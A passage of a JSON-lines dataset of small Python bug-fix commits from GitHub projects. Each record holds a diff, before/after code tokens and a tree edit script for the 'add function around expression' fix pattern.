\"N2\", [\"attribute\", 3, 43, 3, 49], 1], [\"Move\", \"N2\", [\"):)\", 3, 49, 3, 50], 2]]"}
{"project": "DistAlgo", "commit_sha": "0e0c4c62bb01411200ebbc2403ede0728b9555ce", "parent_sha": "059b87094e285f5df4d0b7bd43f1f19722fa9912", "file_path": "da/pattern.py", "project_url": "https://github.com/mayli/DistAlgo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -165,7 +165,7 @@ class Event:\n         \"\"\"Generates a tuple representation for this event.\"\"\"\n         return (type(self),\n                 (self.timestamp, freeze(self.destination), freeze(self.source)),\n-                self.message)\n+                freeze(self.message))\n \n     def __str__(self):\n         buf = [\"<\", type(self).__name__,\n", "before": "return ( type ( self ) , ( self . timestamp , freeze ( self . destination ) , freeze ( self . source ) ) , self . message )", "after": "return ( type ( self ) , ( self . timestamp , freeze ( self . destination ) , freeze ( self . source ) ) , freeze ( self . message ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"tuple\", 1, 16, 3, 30], [\"call\", \"N0\"], 5], [\"Insert\", [\"tuple\", 1, 16, 3, 30], [\"):)\", \"T\"], 6], [\"Insert\", \"N0\", [\"identifier:freeze\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"attribute\", 3, 17, 3, 29], 1], [\"Move\", \"N1\", [\"):)\", 3, 29, 3, 30], 2]]"}
{"project": "puppetboard", "commit_sha": "1f998b11ef5034e2b98644b1c7e74f0be8d83ca6", "parent_sha": "c229f51556132b11d67684ff4bdc6ded4c178a2f", "file_path": "puppetboard/utils.py", "project_url": "https://github.com/mterzo/puppetboard", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -51,7 +51,7 @@ def formatvalue(value):\n     if isinstance(value, str):\n         return value\n     elif isinstance(value, list):\n-        return \", \".join(value)\n+        return \", \".join(map(formatvalue, value))\n     elif isinstance(value, dict):\n         ret = \"\"\n         for k in value:\n", "before": "return \", \" . join ( value )", "after": "return \", \" . join ( map ( formatvalue , value ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 25, 3, 32], [\"call\", \"N0\"], 1], [\"Insert\", [\"argument_list\", 3, 25, 3, 32], [\"):)\", \"T\"], 2], [\"Insert\", \"N0\", [\"identifier:map\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"identifier:formatvalue\", \"T\"], 1], [\"Insert\", \"N1\", [\",:,\", \"T\"], 2], [\"Move\", \"N1\", [\"identifier:value\", 3, 26, 3, 31], 3], [\"Move\", \"N1\", [\"):)\", 3, 31, 3, 32], 4]]"}
{"project": "Pattern-Recognition", "commit_sha": "5ef29631be2f5ec53e94433f722d26881f6ae3e7", "parent_sha": "cb0bf58bbfaeda56e9c9ddb75c5edc2dfa8b830d", "file_path": "Maximum-Likelihood/maximum_likelihood.py", "project_url": "https://github.com/lavahot/Pattern-Recognition", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -9,7 +9,7 @@ def getMaximumLikelihood(training):\n \ttraining = np.array(training)\n-\tif training.shape != 2:\n+\tif len(training.shape) != 2:\n \t\traise Exception('Training data must be an array of vectors.')\n \td = training.shape[1]\n \tmu = []\n", "before": "if training . shape != 2 : raise Exception ( 'Training data must be an array of vectors.' )", "after": "if len ( training . shape ) != 2 : raise Exception ( 'Training data must be an array of vectors.' )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"comparison_operator\", 1, 5, 1, 24], [\"call\", \"N0\"], 0], [\"Insert\", \"N0\", [\"identifier:len\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"attribute\", 1, 5, 1, 19], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "incubator-airflow", "commit_sha": "ba6c78306b60b1629f5a6653dfbbe9ef131ea4ab", "parent_sha": "74b8c2cd96ead29b3d0322137a9b7beab8a9157e", "file_path": "airflow/operators/bash_operator.py", "project_url": "https://github.com/brandsoulmates/incubator-airflow", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -69,7 +69,7 @@ class BashOperator(BaseOperator):\n                 logging.info(\"Output:\")\n                 line = ''\n                 for line in iter(sp.stdout.readline, b''):\n-                    logging.info(line.strip())\n+                    logging.info(\"{}\".format(line.strip()))\n                 sp.wait()\n                 logging.info(\"Command exited with \"\n                              \"return code {0}\".format(sp.returncode))\n", "before": "logging . info ( line . strip ( ) )", "after": "logging . info ( \"{}\" . format ( line . strip ( ) ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"call\", 3, 34, 3, 46], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"call\", 3, 34, 3, 46], [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N0\", [\"string:\\\"{}\\\"\", \"T\"], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:format\", \"T\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"call\", 3, 34, 3, 46], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "ocfweb", "commit_sha": "a02f907cb05cd3dd4a2d088b6b9706cb7b4d40d8", "parent_sha": "d0ecf563e57bb21474e9e8a3a3c4a68d49b8abfc", "file_path": "chpass/views.py", "project_url": "https://github.com/Baisang/ocfweb", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -24,7 +24,7 @@ def change_password(request):\n             account = form.cleaned_data[\"ocf_account\"]\n             password = form.cleaned_data[\"new_password\"]\n \n-            syslog.openlog(\"webchpwd from %s for %s\" % (request.META[\"REMOTE_ADDR\"], account))\n+            syslog.openlog(str(\"webchpwd from %s for %s\" % (request.META[\"REMOTE_ADDR\"], account)))\n \n             try:\n                 change_ad_password(account, password)\n", "before": "syslog . openlog ( \"webchpwd from %s for %s\" % ( request . META [ \"REMOTE_ADDR\" ] , account ) )", "after": "syslog . openlog ( str ( \"webchpwd from %s for %s\" % ( request . META [ \"REMOTE_ADDR\" ] , account ) ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 27, 3, 95], [\"(:(\", \"T\"], 0], [\"Insert\", [\"argument_list\", 3, 27, 3, 95], [\"call\", \"N0\"], 1], [\"Insert\", [\"argument_list\", 3, 27, 3, 95], [\"):)\", \"T\"], 2], [\"Insert\", \"N0\", [\"identifier:str\", \"T\"], 0], [\"Move\", \"N0\", [\"argument_list\", 3, 27, 3, 95], 1]]"}
{"project": "ocfweb", "commit_sha": "b71635238e995134ad13c0dc461b387cbc36d17d", "parent_sha": "95f98d33c8184c8ff1eb01413dc58201d034592a", "file_path": "ocfweb/stats/accounts.py", "project_url": "https://github.com/Baisang/ocfweb", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -48,7 +48,7 @@ def _get_account_stats():\n         assert creation_time is not None\n \n         counts[creation_time] += 1\n-        if account['attributes']['callinkOid']:\n+        if isinstance(account['attributes']['callinkOid'], int):\n             group_counts[creation_time] += 1\n \n     one_day = timedelta(days=1)\n", "before": "if account [ 'attributes' ] [ 'callinkOid' ] : group_counts [ creation_time ] += 1", "after": "if isinstance ( account [ 'attributes' ] [ 'callinkOid' ] , int ) : group_counts [ creation_time ] += 1", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 4, 45], [\"call\", \"N0\"], 1], [\"Insert\", \"N0\", [\"identifier:isinstance\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"subscript\", 3, 12, 3, 47], 1], [\"Insert\", \"N1\", [\",:,\", \"T\"], 2], [\"Insert\", \"N1\", [\"identifier:int\", \"T\"], 3], [\"Insert\", \"N1\", [\"):)\", \"T\"], 4]]"}
{"project": "dedupe", "commit_sha": "1147416dd3744acbafb2fc4a76f6e7cc2bf4ccb9", "parent_sha": "c14a941463343b40a03e3e0923a0b43f9cd3a434", "file_path": "dedupe/clustering.py", "project_url": "https://github.com/c-rap/dedupe", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -68,7 +68,7 @@ def cluster(dupes, threshold=.5):\n     cluster_id = 0\n     for sub_graph in dupe_sub_graphs:\n         if len(sub_graph) > 2:\n-            pair_gen = ((x[0:2], x[2]['weight']) \n+            pair_gen = ((sorted(x[0:2]), x[2]['weight'])\n                         for x in dupe_graph.edges_iter(sub_graph, data=True))\n \n             pairs = numpy.fromiter(pair_gen, dtype=score_dtype)\n", "before": "pair_gen = ( ( x [ 0 : 2 ] , x [ 2 ] [ 'weight' ] ) for x in dupe_graph . edges_iter ( sub_graph , data = True ) )", "after": "pair_gen = ( ( sorted ( x [ 0 : 2 ] ) , x [ 2 ] [ 'weight' ] ) for x in dupe_graph . edges_iter ( sub_graph , data = True ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"tuple\", 3, 25, 3, 49], [\"call\", \"N0\"], 1], [\"Insert\", \"N0\", [\"identifier:sorted\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"subscript\", 3, 26, 3, 32], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "mono_vo_python", "commit_sha": "9ccf365d53495752d9fc20c8b60290a4ef567feb", "parent_sha": "e3b8b560c4e19acc80c6f946b110ff3f88700029", "file_path": "dataset.py", "project_url": "https://github.com/yoshimasa1700/mono_vo_python", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -73,7 +73,7 @@ class Dataset():\n class KittiDataset(Dataset):\n     def __init__(self, path):\n         self.image_format_left = '{:06d}.png'\n-        self.path = path\n+        self.path = os.path.join(path, 'image_0')\n         self.calibfile = os.path.join(path, 'calib.txt')\n         sequence_count = path.split('/')[-1]\n         gt_path = os.path.join(path, '..', '..',\n", "before": "self . path = path", "after": "self . path = os . path . join ( path , 'image_0' )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"assignment\", 3, 9, 3, 25], [\"call\", \"N0\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Insert\", \"N1\", [\"attribute\", \"N3\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:join\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"identifier:path\", \"T\"], 1], [\"Insert\", \"N2\", [\",:,\", \"T\"], 2], [\"Insert\", \"N2\", [\"string:'image_0'\", \"T\"], 3], [\"Insert\", \"N2\", [\"):)\", \"T\"], 4], [\"Insert\", \"N3\", [\"identifier:os\", \"T\"], 0], [\"Insert\", \"N3\", [\".:.\", \"T\"], 1], [\"Move\", \"N3\", [\"identifier:path\", 3, 21, 3, 25], 2]]"}
{"project": "auto-perf-test", "commit_sha": "ac1672d50048101a142aa1f799f5769eede55d66", "parent_sha": "e31ee5ac215042425ff941e2a3d470cc737c661e", "file_path": "autotest.py", "project_url": "https://github.com/ScreamingUdder/auto-perf-test", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -50,7 +50,7 @@ def start_build_commit(job_queue):\n     logfile = open('build_log.txt', 'w+')\n     return subprocess.Popen(\n         'cmake3 -DENABLE_MANTIDPLOT=OFF -DENABLE_OPENCASCADE=OFF -B' + BUILD_PATH + ' -H' + REPO_PATH + '; make -j8 -C ' + BUILD_PATH + ' Framework',\n-        stdout=logfile, shell=True), logfile, status, sha\n+        stdout=logfile, shell=True), logfile, status, CurrentJob(sha)\n \n \n def poll_for_process_end(process, logfile, status, current_job):\n", "before": "return subprocess . Popen ( 'cmake3 -DENABLE_MANTIDPLOT=OFF -DENABLE_OPENCASCADE=OFF -B' + BUILD_PATH + ' -H' + REPO_PATH + '; make -j8 -C ' + BUILD_PATH + ' Framework' , stdout = logfile , shell = True ) , logfile , status , sha", "after": "return subprocess . Popen ( 'cmake3 -DENABLE_MANTIDPLOT=OFF -DENABLE_OPENCASCADE=OFF -B' + BUILD_PATH + ' -H' + REPO_PATH + '; make -j8 -C ' + BUILD_PATH + ' Framework' , stdout = logfile , shell = True ) , logfile , status , CurrentJob ( sha )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"expression_list\", 1, 12, 3, 58], [\"call\", \"N0\"], 6], [\"Insert\", \"N0\", [\"identifier:CurrentJob\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"identifier:sha\", 3, 55, 3, 58], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "xos-1", "commit_sha": "d51b6d2b1d899ef0178f5f2ed5e11b1a70706977", "parent_sha": "4025ad60b5e2d36427251157bde6a85c537011b5", "file_path": "xos/services/vpn/admin.py", "project_url": "https://github.com/vpramo/xos-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -94,7 +94,7 @@ class VPNTenantForm(forms.ModelForm):\n             self.fields['client_address'].initial = \"10.8.0.2\"\n             self.fields['is_persistent'].initial = True\n             self.fields['can_view_subnet'].initial = False\n-            self.fields['file_name'].initial = \"/static/vpn/\" + time.time() + \".vpn\"\n+            self.fields['file_name'].initial = \"/static/vpn/\" + str(time.time()) + \".vpn\"\n             if VPNService.get_service_objects().exists():\n                 self.fields[\"provider_service\"].initial = VPNService.get_service_objects().all()[\n                     0]\n", "before": "self . fields [ 'file_name' ] . initial = \"/static/vpn/\" + time . time ( ) + \".vpn\"", "after": "self . fields [ 'file_name' ] . initial = \"/static/vpn/\" + str ( time . time ( ) ) + \".vpn\"", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"call\", 3, 65, 3, 76], [\"identifier:str\", \"T\"], 0], [\"Insert\", [\"call\", 3, 65, 3, 76], [\"argument_list\", \"N0\"], 1], [\"Insert\", \"N0\", [\"(:(\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 65, 3, 76], 1], [\"Insert\", \"N0\", [\"):)\", \"T\"], 2]]"}
{"project": "features", "commit_sha": "037effac8fa735fff4983bfd3940e1bcc24ba38e", "parent_sha": "5a104c11ee4ae61b60e13bb1ef1b611d6e433508", "file_path": "src/recipes/0000000000000002/recipe.py", "project_url": "https://github.com/ScreamingUdder/features", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1,6 +1,6 @@\n def _visit_NXdetector_with_image_key(name, obj):\r\n     if \"NX_class\" in obj.attrs.keys():\r\n-        if obj.attrs[\"NX_class\"] in [\"NXdetector\"]:\r\n+        if str(obj.attrs[\"NX_class\"], 'utf8') in [\"NXdetector\"]:\r\n             if \"image_key\" in obj.keys():\r\n                 return obj\r\n \r\n", "before": "if obj . attrs [ \"NX_class\" ] in [ \"NXdetector\" ] : if \"image_key\" in obj . keys ( ) : return obj", "after": "if str ( obj . attrs [ \"NX_class\" ] , 'utf8' ) in [ \"NXdetector\" ] : if \"image_key\" in obj . keys ( ) : return obj", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"comparison_operator\", 2, 12, 2, 51], [\"call\", \"N0\"], 0], [\"Insert\", \"N0\", [\"identifier:str\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"subscript\", 2, 12, 2, 33], 1], [\"Insert\", \"N1\", [\",:,\", \"T\"], 2], [\"Insert\", \"N1\", [\"string:'utf8'\", \"T\"], 3], [\"Insert\", \"N1\", [\"):)\", \"T\"], 4]]"}
{"project": "erpnext-v7", "commit_sha": "a06c2ceaffda6309696f547fb2a9ea05ffbad91f", "parent_sha": "269115f191ca19fd727fba20a1524693db912518", "file_path": "setup/doctype/manage_account/manage_account.py", "project_url": "https://github.com/YefriTavarez/erpnext-v7", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -29,7 +29,7 @@ class DocType:\n     set_default(defkey, defvalue)\n \n     if defkey == 'fiscal_year':\n-      ysd = sql(\"select year_start_date from `tabFiscal Year` where name=%s\", defvalue)\n+      ysd = sql(\"select year_start_date from `tabFiscal Year` where name=%s\", cstr(defvalue))\n       ysd = ysd and ysd[0][0] or ''\n       if ysd:\n         set_default('year_start_date', ysd.strftime('%Y-%m-%d'))\n", "before": "ysd = sql ( \"select year_start_date from `tabFiscal Year` where name=%s\" , defvalue )", "after": "ysd = sql ( \"select year_start_date from `tabFiscal Year` where name=%s\" , cstr ( defvalue ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 16, 3, 88], [\"call\", \"N0\"], 3], [\"Insert\", [\"argument_list\", 3, 16, 3, 88], [\"):)\", \"T\"], 4], [\"Insert\", \"N0\", [\"identifier:cstr\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"identifier:defvalue\", 3, 79, 3, 87], 1], [\"Move\", \"N1\", [\"):)\", 3, 87, 3, 88], 2]]"}
{"project": "django-shop", "commit_sha": "d4af5d643beaccea96e3c3e788d68623492aa89d", "parent_sha": "3ed7cfeff8787bd6697fbad24df52b75187ce94e", "file_path": "shop/rest/renderers.py", "project_url": "https://github.com/haricot/django-shop", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -19,7 +19,7 @@ class CMSPageRenderer(renderers.TemplateHTMLRenderer):\n         view = renderer_context['view']\n         request = renderer_context['request']\n         response = renderer_context['response']\n-        template_context = self.get_template_context(data, renderer_context)\n+        template_context = self.get_template_context(dict(data), renderer_context)\n \n         if response.exception:\n             template = self.get_exception_template(response)\n", "before": "template_context = self . get_template_context ( data , renderer_context )", "after": "template_context = self . get_template_context ( dict ( data ) , renderer_context )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 53, 3, 77], [\"call\", \"N0\"], 1], [\"Insert\", \"N0\", [\"identifier:dict\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"identifier:data\", 3, 54, 3, 58], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "askbot-devel", "commit_sha": "12445c98511606ea474c145dc099170b8b543afa", "parent_sha": "26cd04c47c3d631d1eb62fcc8f04761c34ff3a55", "file_path": "askbot/middleware/cancel.py", "project_url": "https://github.com/kingctan/askbot-devel", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -8,7 +8,7 @@ class CancelActionMiddleware(object):\n                 msg = getattr(view_func,'CANCEL_MESSAGE')\n             except AttributeError:\n                 msg = 'action canceled'\n-            request.user.message_set.create(message=msg)\n+            request.user.message_set.create(message=unicode(msg))\n             return HttpResponseRedirect(get_next_url(request))\n         else:\n             return None\n", "before": "request . user . message_set . create ( message = msg )", "after": "request . user . message_set . create ( message = unicode ( msg ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 45, 3, 56], [\"call\", \"N0\"], 2], [\"Insert\", \"N0\", [\"identifier:unicode\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"identifier:msg\", 3, 53, 3, 56], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "django-shop", "commit_sha": "56b5ba8620059d11c365aff9c5e3c0d194f8628b", "parent_sha": "b94467e4b3f1d7c23f310bd3bef31a01e09dd8fe", "file_path": "shop/models/order.py", "project_url": "https://github.com/haricot/django-shop", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -142,7 +142,7 @@ class WorkflowMixinMetaclass(deferred.ForeignKeyBuilder):\n \n     def __new__(cls, name, bases, attrs):\n         if 'BaseOrder' in (b.__name__ for b in bases):\n-            bases = app_settings.ORDER_WORKFLOWS + bases\n+            bases = tuple(app_settings.ORDER_WORKFLOWS) + bases\n             # merge the dicts of TRANSITION_TARGETS\n             attrs.update(_transition_targets={}, _auto_transitions={})\n             for b in reversed(bases):\n", "before": "bases = app_settings . ORDER_WORKFLOWS + bases", "after": "bases = tuple ( app_settings . ORDER_WORKFLOWS ) + bases", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"binary_operator\", 3, 21, 3, 57], [\"call\", \"N0\"], 0], [\"Insert\", \"N0\", [\"identifier:tuple\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"attribute\", 3, 21, 3, 49], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "harpoon-2", "commit_sha": "dbf2a941f9da3303f4e5c6bce2c60368d6058f40", "parent_sha": "6e3f506eeac362c98ff247c76ff4d3ec8055d443", "file_path": "harpoon/overview.py", "project_url": "https://github.com/pombredanne/harpoon-2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -97,7 +97,7 @@ class Overview(object):\n                 return {}\n             return yaml.load(open(filepath))\n         except yaml.parser.ParserError as error:\n-            raise BadYaml(\"Failed to read yaml\", location=filepath, error_type=error.__class__.__name__, error=error.problem)\n+            raise BadYaml(\"Failed to read yaml\", location=filepath, error_type=error.__class__.__name__, error=\"{0}{1}\".format(error.problem, error.problem_mark))\n \n     def get_committime_or_mtime(self, location):\n         \"\"\"Get the commit time of some file or the modified time of of it if can't get from git\"\"\"\n", "before": "except yaml . parser . ParserError as error : raise BadYaml ( \"Failed to read yaml\" , location = filepath , error_type = error . __class__ . __name__ , error = error . problem )", "after": "except yaml . parser . ParserError as error : raise BadYaml ( \"Failed to read yaml\" , location = filepath , error_type = error . __class__ . __name__ , error = \"{0}{1}\" . format ( error . problem , error . problem_mark ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 106, 3, 125], [\"call\", \"N0\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Insert\", \"N1\", [\"string:\\\"{0}{1}\\\"\", \"T\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:format\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Move\", \"N2\", [\"attribute\", 3, 112, 3, 125], 1], [\"Insert\", \"N2\", [\",:,\", \"T\"], 2], [\"Insert\", \"N2\", [\"attribute\", \"N3\"], 3], [\"Insert\", \"N2\", [\"):)\", \"T\"], 4], [\"Insert\", \"N3\", [\"identifier:error\", \"T\"], 0], [\"Insert\", \"N3\", [\".:.\", \"T\"], 1], [\"Insert\", \"N3\", [\"identifier:problem_mark\", \"T\"], 2]]"}
{"project": "aws_tools", "commit_sha": "b0032aa17e14d4097d4d933e863d09fcabbda984", "parent_sha": "ac75d160dc84547f2930338cc85b210170d6c96f", "file_path": "aws_tools/tasks.py", "project_url": "https://github.com/vladvasiliu/aws_tools", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -281,7 +281,7 @@ def _execute_schedule(schedule: InstanceSchedule):\n @shared_task(bind=True)\n def run_schedules(self):\n     for schedule in InstanceSchedule.objects.all():\n-        schedule_hexdigest = md5(schedule.id.encode()).hexdigest()\n+        schedule_hexdigest = md5(str(schedule.id).encode()).hexdigest()\n         lock_id = \"{0}-lock-{1}\".format(self.name, schedule_hexdigest)\n         with cache_lock(lock_id, self.app.oid) as acquired:\n             if acquired:\n", "before": "schedule_hexdigest = md5 ( schedule . id . encode ( ) ) . hexdigest ( )", "after": "schedule_hexdigest = md5 ( str ( schedule . id ) . encode ( ) ) . hexdigest ( )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"attribute\", 3, 34, 3, 52], [\"call\", \"N0\"], 0], [\"Insert\", \"N0\", [\"identifier:str\", \"T\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N1\"], 1], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Move\", \"N1\", [\"attribute\", 3, 34, 3, 45], 1], [\"Insert\", \"N1\", [\"):)\", \"T\"], 2]]"}
{"project": "python-markdown2", "commit_sha": "883c59f1190d5a0d24261f040b80e157155b0120", "parent_sha": "3440c5343099f8e1bee292d3aa64db6c255fcdd5", "file_path": "lib/markdown2.py", "project_url": "https://github.com/pombredanne/python-markdown2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -2440,7 +2440,7 @@ def main(argv=None):\n                 sys.stdout.encoding or \"utf-8\", 'xmlcharrefreplace'))\n         if extras and \"toc\" in extras:\n             log.debug(\"toc_html: \" +\n-                html.toc_html.encode(sys.stdout.encoding or \"utf-8\", 'xmlcharrefreplace'))\n+                str(html.toc_html.encode(sys.stdout.encoding or \"utf-8\", 'xmlcharrefreplace')))\n         if opts.compare:\n             test_dir = join(dirname(dirname(abspath(__file__))), \"test\")\n             if exists(join(test_dir, \"test_markdown2.py\")):\n", "before": "log . debug ( \"toc_html: \" + html . toc_html . encode ( sys . stdout . encoding or \"utf-8\" , 'xmlcharrefreplace' ) )", "after": "log . debug ( \"toc_html: \" + str ( html . toc_html . encode ( sys . stdout . encoding or \"utf-8\" , 'xmlcharrefreplace' ) ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"call\", 3, 17, 3, 90], [\"identifier:str\", \"T\"], 0], [\"Insert\", [\"call\", 3, 17, 3, 90], [\"argument_list\", \"N0\"], 1], [\"Insert\", \"N0\", [\"(:(\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 17, 3, 90], 1], [\"Insert\", \"N0\", [\"):)\", \"T\"], 2]]"}
{"project": "Cura", "commit_sha": "4769b22138a739cbb113976defb196747891931e", "parent_sha": "a8ebdc8e395c366bbf3cb6e1dc44dbade92f23c5", "file_path": "plugins/GCodeWriter/GCodeWriter.py", "project_url": "https://github.com/themaninthesuitcase/Cura", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -106,7 +106,7 @@ class GCodeWriter(MeshWriter):\n         serialized = flat_global_container.serialize()\n         data = {\"global_quality\": serialized}\n \n-        for extruder in ExtruderManager.getInstance().getMachineExtruders(stack.getId()):\n+        for extruder in sorted(ExtruderManager.getInstance().getMachineExtruders(stack.getId()), key = lambda k: k.getMetaDataEntry(\"position\")):\n             extruder_quality = extruder.findContainer({\"type\": \"quality_changes\"})\n             if not extruder_quality:\n                 Logger.log(\"w\", \"No extruder quality profile found, not writing quality for extruder %s to file!\", extruder.getId())\n", "before": "for extruder in ExtruderManager . getInstance ( ) . getMachineExtruders ( stack . getId ( ) ) : extruder_quality = extruder . findContainer ( { \"type\" : \"quality_changes\" } ) if not extruder_quality : Logger . log ( \"w\" , \"No extruder quality profile found, not writing quality for extruder %s to file!\" , extruder . getId ( ) )", "after": "for extruder in sorted ( ExtruderManager . getInstance ( ) . getMachineExtruders ( stack . getId ( ) ) , key = lambda k : k . getMetaDataEntry ( \"position\" ) ) : extruder_quality = extruder . findContainer ( { \"type\" : \"quality_changes\" } ) if not extruder_quality : Logger . log ( \"w\" , \"No extruder quality profile found, not writing quality for extruder %s to file!\" , extruder . getId ( ) )", "sstub_pattern": "ADD_FUNCTION_AROUND_EXPRESSION", "edit_script": "[[\"Insert\", [\"call\", 3, 25, 3, 89], [\"identifier:sorted\", \"T\"], 0], [\"Insert\", [\"call\", 3, 25, 3, 89], [\"argument_list\", \"N0\"], 1], [\"Insert\", \"N0\", [\"(:(\", \"T\"], 0], [\"Move\", \"N0\", [\"call\", 3, 25, 3, 89], 1], [\"Insert\", \"N0\", [\",:,\", \"T\"], 2], [\"Insert\", \"N0\", [\"keyword_argument\", \"N1\"], 3], [\"Insert\", \"N0\", [\"):)\", \"T\"], 4], [\"Insert\", \"N1\", [\"identifier:key\", \"T\"], 0], [\"Insert\", \"N1\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N1\", [\"lambda\", \"N2\"], 2], [\"Insert\", \"N2\", [\"lambda:lambda\", \"T\"], 0], [\"Insert\", \"N2\", [\"lambda_parameters\", \"N3\"], 1], [\"Insert\", \"N2\", [\":::\", \"T\"], 2], [\"Insert\", \"N2\", [\"call\", \"N4\"], 3], [\"Insert\", \"N3\", 